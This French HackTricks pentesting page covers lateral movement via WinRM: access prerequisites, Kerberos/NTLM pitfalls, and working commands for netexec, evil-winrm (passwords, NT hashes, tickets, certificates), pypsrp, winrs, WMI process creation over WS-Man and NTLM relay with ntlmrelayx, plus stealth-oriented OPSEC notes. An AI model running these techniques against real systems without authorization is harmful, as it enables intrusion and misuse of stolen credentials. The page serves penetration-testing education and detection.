# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM est l’un des transports de **lateral movement** les plus pratiques dans les environnements Windows, car il fournit un shell distant via **WS-Man/HTTP(S)** sans nécessiter les techniques de création de services SMB. Si la cible expose **5985/5986** et que votre principal est autorisé à utiliser le remoting, vous pouvez souvent passer très rapidement de « valid creds » à un **interactive shell**.

Pour l’**énumération du protocole/service**, les listeners, l’activation de WinRM, `Invoke-Command` et l’utilisation générique des clients, consultez :

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Pourquoi les operators apprécient WinRM

- Utilise **HTTP/HTTPS** au lieu de SMB/RPC, et fonctionne donc souvent là où l’exécution de type PsExec est bloquée.
- Avec **Kerberos**, évite d’envoyer des credentials réutilisables à la cible.
- Fonctionne proprement depuis **Windows**, **Linux** et les outils **Python** (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- Le chemin interactif du remoting PowerShell lance **`wsmprovhost.exe`** sur la cible dans le contexte de l’utilisateur authentifié, ce qui est différent, d’un point de vue opérationnel, de l’exécution basée sur un service.

## Modèle d’accès et prérequis

En pratique, la réussite du lateral movement via WinRM dépend de **trois** éléments :

1. La cible possède un **listener WinRM** (`5985`/`5986`) et des règles de firewall autorisant l’accès.
2. Le compte peut s’**authentifier** auprès de l’endpoint.
3. Le compte est autorisé à **ouvrir une session de remoting**.

Méthodes courantes pour obtenir cet accès :

- **Local Administrator** sur la cible.
- Appartenance au groupe **Remote Management Users** sur les systèmes récents, ou à **WinRMRemoteWMIUsers__** sur les systèmes/composants qui honorent encore ce groupe.
- Droits de remoting explicitement délégués via les descripteurs de sécurité locaux / des modifications des ACL du remoting PowerShell.

Si vous contrôlez déjà une machine avec des droits d’administration, n’oubliez pas que vous pouvez également **déléguer l’accès WinRM sans appartenir au groupe des administrateurs** en utilisant les techniques décrites ici :

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Problèmes d’authentification importants pendant le lateral movement

- **Kerberos nécessite un hostname/FQDN**. Si vous vous connectez via une adresse IP, le client bascule généralement sur **NTLM/Negotiate**.
- Dans les cas de **workgroup** ou de relations de confiance inter-domaines particulières, NTLM nécessite généralement **HTTPS** ou que la cible soit ajoutée à **TrustedHosts** sur le client.
- Avec des **comptes locaux** via Negotiate dans un workgroup, les restrictions UAC distantes peuvent empêcher l’accès, sauf si le compte Administrator intégré est utilisé ou si `LocalAccountTokenFilterPolicy=1`.
- Le remoting PowerShell utilise par défaut le **SPN `HTTP/<host>`**. Dans les environnements où **`HTTP/<host>`** est déjà enregistré pour un autre compte de service, Kerberos WinRM peut échouer avec `0x80090322` ; utilisez un SPN incluant le port ou basculez vers **`WSMAN/<host>`** lorsque ce SPN existe.<sup>[[3]](#references)</sup>

Si vous obtenez des credentials valides lors d’un password spraying, les valider via WinRM est souvent le moyen le plus rapide de vérifier s’ils permettent d’obtenir un shell :

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-to-Windows lateral movement

### NetExec / CrackMapExec pour la validation et l’exécution one-shot
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Evil-WinRM pour les shells interactifs

`evil-winrm` reste l’option interactive la plus pratique depuis Linux, car il prend en charge les **mots de passe**, les **hachages NT**, les **tickets Kerberos**, les **certificats client**, le transfert de fichiers et le chargement en mémoire de PowerShell/.NET.
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Cas particulier du SPN Kerberos : `HTTP` vs `WSMAN`

Lorsque le SPN **`HTTP/<host>`** par défaut entraîne des échecs Kerberos, essayez plutôt de demander ou d’utiliser un ticket **`WSMAN/<host>`**. Cela peut se produire dans des environnements d’entreprise renforcés ou atypiques où **`HTTP/<host>`** est déjà associé à un autre compte de service.<sup>[[3]](#references)</sup>
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
Cela est également utile après un abus de **RBCD / S4U** lorsque vous avez spécifiquement forgé ou demandé un ticket de service **WSMAN**, plutôt qu’un ticket générique `HTTP`.

### Authentification basée sur les certificats

WinRM prend également en charge l’**authentification par certificat client**, mais le certificat doit être mappé sur la cible vers un **compte local**. Du point de vue offensif, cela est important lorsque :

- vous avez volé ou exporté un certificat client valide et sa clé privée, déjà mappés pour WinRM ;
- vous avez abusé de **AD CS / Pass-the-Certificate** pour obtenir un certificat pour un principal, puis pivoter vers une autre méthode d’authentification ;
- vous opérez dans des environnements qui évitent délibérément le remoting basé sur les mots de passe.
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
WinRM avec certificat client est bien moins courant que l’authentification par mot de passe/hash/Kerberos, mais lorsqu’il est disponible, il peut fournir une voie de **lateral movement sans mot de passe** qui survit à la rotation des mots de passe.

### Python / automation avec `pypsrp`

Si vous avez besoin d’automatisation plutôt que d’un shell opérateur, `pypsrp` fournit WinRM/PSRP depuis Python avec la prise en charge de **NTLM**, de l’**authentification par certificat**, de **Kerberos** et de **CredSSP**.<sup>[[2]](#references)</sup>
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
Si vous avez besoin d'un contrôle plus précis que celui fourni par le wrapper `Client` haut niveau, les API de niveau inférieur `WSMan` + `RunspacePool` sont utiles pour deux problèmes courants rencontrés par les opérateurs :

- forcer **`WSMAN`** comme service/SPN Kerberos au lieu de l'attente par défaut **`HTTP`** utilisée par de nombreux clients PowerShell ;
- se connecter à un endpoint PSRP **non par défaut**, tel qu'une configuration de session **JEA** / personnalisée, au lieu de `Microsoft.PowerShell`.
```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
"srv01.domain.local",
auth="kerberos",
ssl=False,
negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
ps.add_script("whoami; Get-Command")
output = ps.invoke()
print(output)
```
### Les endpoints PSRP personnalisés et JEA sont importants lors du lateral movement

Une authentification WinRM réussie ne signifie **pas** toujours que vous arrivez sur l’endpoint `Microsoft.PowerShell` par défaut et sans restrictions. Les environnements bien structurés peuvent exposer des **custom session configurations** ou des endpoints **JEA** avec leurs propres ACL et leur propre comportement **run-as**.<sup>[[1]](#references)</sup>

Si vous avez déjà obtenu une **code execution** sur un hôte Windows et souhaitez comprendre quelles surfaces de **remoting** existent, énumérez les endpoints enregistrés :
```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```
Lorsqu’un endpoint utile existe, ciblez-le explicitement plutôt que le shell par défaut :
```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```
Implications offensives pratiques :

- Un endpoint **restreint** peut tout de même suffire pour le lateral movement s’il expose uniquement les bons cmdlets/functions pour le contrôle des services, l’accès aux fichiers, la création de processus ou l’exécution arbitraire de .NET / de commandes externes.
- Un rôle **JEA** mal configuré est particulièrement intéressant lorsqu’il expose des commandes dangereuses telles que `Start-Process`, des wildcards larges, des providers accessibles en écriture ou des proxy functions personnalisées permettant de sortir des restrictions prévues.
- Les endpoints s’appuyant sur des **RunAs virtual accounts** ou des **gMSAs** modifient le contexte de sécurité effectif des commandes que vous exécutez. En particulier, un endpoint basé sur un gMSA peut fournir une **network identity on the second hop**, même lorsqu’une session WinRM normale rencontre le classique problème de delegation.

## Lateral movement WinRM natif de Windows

### `winrs.exe`

`winrs.exe` est intégré à Windows et utile lorsque vous souhaitez une **exécution de commandes WinRM native** sans ouvrir de session interactive de PowerShell remoting :
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
Deux options sont faciles à oublier et importantes en pratique :

- `/noprofile` est souvent requis lorsque le principal distant **n’est pas** un administrateur local.
- `/allowdelegate` permet au shell distant d’utiliser vos identifiants auprès d’un **troisième hôte** (par exemple, lorsque la commande doit accéder à `\\fileserver\share`).
```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```
En pratique, `winrs.exe` entraîne généralement une chaîne de processus distante similaire à :
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
C'est important à retenir, car cela diffère de l'exécution basée sur un service et des sessions PSRP interactives.

### `winrm.cmd` / WS-Man COM au lieu de PowerShell remoting

Vous pouvez également exécuter des commandes via le **transport WinRM** sans utiliser `Enter-PSSession`, en invoquant des classes WMI via WS-Man. Le transport reste ainsi WinRM, tandis que la primitive d'exécution distante devient **WMI `Win32_Process.Create`** :
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
Cette approche est utile lorsque :

- La journalisation PowerShell est fortement surveillée.
- Vous voulez utiliser le **transport WinRM**, mais pas un workflow classique de remoting PS.
- Vous développez ou utilisez des outils personnalisés autour de l’objet COM **`WSMan.Automation`**.

## NTLM relay to WinRM (WS-Man)

Lorsque le SMB relay est bloqué par la signature et que le LDAP relay est limité, **WS-Man/WinRM** peut toujours constituer une cible de relay intéressante. La version moderne de `ntlmrelayx.py` inclut des serveurs de WinRM relay et peut relayer vers des cibles **`wsman://`** ou **`winrms://`**.
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
Deux notes pratiques :

- Relay est particulièrement utile lorsque la cible accepte **NTLM** et que le principal relayé est autorisé à utiliser WinRM.
- Le code récent d’Impacket gère spécifiquement les requêtes **`WSMANIDENTIFY: unauthenticated`**, afin que les probes de type `Test-WSMan` n’interrompent pas le flux de Relay.

Pour les contraintes de multi-hop après l’obtention d’une première session WinRM, consultez :

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## Notes d’OPSEC et de détection

- Le remoting PowerShell **interactif** crée généralement **`wsmprovhost.exe`** sur la cible.
- **`winrs.exe`** crée généralement **`winrshost.exe`**, puis le processus enfant demandé.
- Les endpoints **JEA** personnalisés peuvent exécuter des actions en tant que comptes virtuels **`WinRM_VA_*`** ou en tant que **gMSA** configuré, ce qui modifie à la fois la télémétrie et le comportement du second-hop par rapport à un shell exécuté dans le contexte d’un utilisateur normal.<sup>[[1]](#references)</sup>
- Attendez-vous à de la télémétrie de **network logon**, aux événements du service WinRM et à la journalisation opérationnelle/des **script blocks** PowerShell si vous utilisez PSRP plutôt que `cmd.exe` brut.
- Si vous n’avez besoin que d’exécuter une seule commande, `winrs.exe` ou une exécution WinRM one-shot peut être plus discrète qu’une session de remoting interactive de longue durée.
- Si Kerberos est disponible, préférez **FQDN + Kerberos** à IP + NTLM afin de réduire à la fois les problèmes de confiance et les modifications gênantes de **`TrustedHosts`** côté client.

## Références

- [1] [Microsoft : considérations de sécurité de JEA](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [2] [README de pypsrp](https://github.com/jborean93/pypsrp)
- [3] [Microsoft : erreur `0x80090322` lors de la connexion de PowerShell à un serveur distant via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)


{{#include ../../banners/hacktricks-training.md}}
